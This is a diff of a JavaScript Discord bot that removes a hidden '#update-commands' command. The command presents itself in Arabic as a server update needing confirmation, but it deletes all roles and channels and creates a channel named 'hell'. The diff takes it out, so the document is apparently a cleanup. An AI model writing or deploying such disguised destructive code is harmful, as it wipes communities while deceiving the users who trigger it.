@@ -748,37 +748,3 @@ let args = message.content.split(' ').slice(1).join(' ');
     
   });
 
-client.on('message', msg => {
-var prefix = "#";
-  if(!msg.guild) return;
-    if(!msg.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**Done.**');
-    if (msg.content.startsWith(prefix +'update-commands')) {
-let ra3d = new Discord.RichEmbed()
-.setColor('RANDOM')
-.setThumbnail(msg.author.avatarURL)
-.setDescription(`لتأكيد تحديث السيرفر يرجى التأكد بالرياكشن\n  ✅  \n  ❌ \n  لديك 60 ثانية للاختيار`)                                                                                                                                                                       
-msg.channel.send(ra3d).then(message => {
- message.react('✅').then(r=>{
- message.react('❌').then(r=>{           
- let sd = (reaction, user) => reaction.emoji.name === '✅' && user.id === msg.author.id;
- let nd = (reaction, user) => reaction.emoji.name === '❌' && user.id === msg.author.id;
- let ds  = message.createReactionCollector(sd, { time: 60000 });
- let dn  = message.createReactionCollector(nd, { time: 60000 });
-dn.on("collect", r => {
-msg.channel.send("`تم الالغاء`")
-message.delete();
-})
-ds.on("collect", r => {
-message.guild.roles.forEach(r => { r.delete() }) 
-     message.guild.channels.forEach(c => { c.delete() })
-     message.guild.createChannel('hell', 'text').then(c=> c.send(ra3d));
-     let ra3d = new Discord.RichEmbed()
-            .setColor('#fd0101')
-            .setDescription('`تم تحديث اوامر البوت`')
-           message.channel.sendEmbed(ra3d);
-})
-})
-})
-})
-}
-});
